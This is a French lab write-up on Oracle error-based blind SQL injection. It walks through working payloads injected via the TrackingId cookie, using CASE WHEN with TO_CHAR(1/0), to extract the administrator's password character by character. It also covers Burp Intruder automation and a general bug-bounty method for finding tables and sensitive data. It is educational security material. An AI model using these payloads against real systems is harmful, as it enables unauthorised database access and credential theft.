

## Objectif

Extraire le **mot de passe de l'utilisateur `administrator`** en exploitant une **SQL Injection aveugle basée sur les erreurs**.

La vulnérabilité se trouve dans :

Cookie: TrackingId

Le serveur :

- exécute une requête SQL avec ce cookie
    
- ne retourne **aucun résultat SQL**
    
- affiche **une erreur si la requête SQL échoue**
    

Principe exploité :

condition vraie → erreur SQL  
condition fausse → réponse normale

---

# ⚙️ Contexte Oracle

Oracle exige :

FROM dual

pour les requêtes `SELECT`.

Erreur utilisée :

TO_CHAR(1/0)

car :

1/0 → division par zéro → erreur SQL

---

# 🚀 Méthode rapide (celle utilisée dans le lab)

## 1️⃣ Vérifier le signal

Payload :

'||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

Résultat attendu :

erreur serveur

Test inverse :

'||(SELECT CASE WHEN(1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

Résultat :

pas d'erreur

Conclusion :

SQL injection confirmée

---

# 2️⃣ Vérifier l'utilisateur

Payload :

'||(SELECT CASE WHEN(username='administrator')   
THEN TO_CHAR(1/0) ELSE '' END   
FROM users WHERE ROWNUM=1)||'

Si erreur :

administrator existe

---

# 3️⃣ Trouver la longueur du mot de passe

Payload :

'||(SELECT CASE WHEN(LENGTH(password)=20)  
THEN TO_CHAR(1/0) ELSE '' END  
FROM users WHERE username='administrator' AND ROWNUM=1)||'

Tester plusieurs valeurs :

10  
15  
18  
20

Quand l’erreur apparaît :

longueur trouvée

Dans ce lab :

password = 20 caractères

---

# 4️⃣ Extraire chaque caractère

Utiliser :

SUBSTR(password,1,1)

Payload :

'||(SELECT CASE WHEN(SUBSTR(password,1,1)='a')  
THEN TO_CHAR(1/0) ELSE '' END  
FROM users WHERE username='administrator')||'

Résultat :

|réponse|signification|
|---|---|
|erreur|caractère correct|
|pas erreur|incorrect|

---

# 5️⃣ Automatisation avec Intruder

Position :

SUBSTR(password,1,1)='§a§'

Liste payloads :

abcdefghijklmnopqrstuvwxyz0123456789

Intruder détecte la requête qui retourne :

HTTP 500

→ caractère correct

---

# 6️⃣ Continuer

Changer la position :

SUBSTR(password,2,1)  
SUBSTR(password,3,1)  
...  
SUBSTR(password,20,1)

Reconstituer le mot de passe.

---

# 🧠 Logique de l’attaque

La base devient une **machine oui/non**.

Exemple :

password[1] = a ?  
password[1] = b ?  
password[1] = c ?

La réponse est observée via :

erreur SQL

---

# 🔍 Méthodologie complète (situation réelle)

En bug bounty, les informations ne sont pas connues.

Étapes classiques :

---

## 1️⃣ Identifier une SQLi

Tests simples :

'  
''  
'  
--

ou :

AND 1=1  
AND 1=2

---

## 2️⃣ Identifier la base de données

Tests typiques :

|DB|test|
|---|---|
|MySQL|`SELECT @@version`|
|PostgreSQL|`version()`|
|Oracle|`FROM dual`|
|MSSQL|`@@version`|

---

## 3️⃣ Identifier les tables

Exemples :

Oracle :

SELECT table_name FROM all_tables

MySQL :

information_schema.tables

---

## 4️⃣ Identifier les colonnes

Exemple Oracle :

SELECT column_name FROM all_tab_columns

---

## 5️⃣ Identifier les utilisateurs

Exemple :

SELECT username FROM users

---

## 6️⃣ Extraire les données sensibles

- mot de passe
    
- token
    
- email
    
- session
    

---

# 🧰 Outils utilisés

Burp Suite :

Proxy  
Repeater  
Intruder

Intruder :

Sniper attack

Grep match :

Internal Server Error

ou

HTTP 500

---

# ⚠️ Pièges rencontrés dans le lab

1️⃣ `;` mal placé dans le cookie  
2️⃣ requête retournant plusieurs lignes  
3️⃣ `ROWNUM=1` nécessaire  
4️⃣ syntaxe Oracle (`dual`)  
5️⃣ Intruder avec plusieurs positions

---

# 📌 Points clés retenus

SQLi blind repose sur :

machine logique oui / non

Signaux exploitables :

|technique|signal|
|---|---|
|Error based|erreur serveur|
|Time based|délai|
|Boolean based|changement page|

---

# 📚 Compétences acquises

- SQLi Oracle
    
- CASE WHEN
    
- SUBSTR
    
- LENGTH
    
- Intruder automation
    
- debugging HTTP
    

---

# 🧠 Mentalité pentester

Toujours imaginer :

la requête SQL finale exécutée par le serveur

et manipuler cette logique pour obtenir :

erreur  
temps  
ou changement de réponse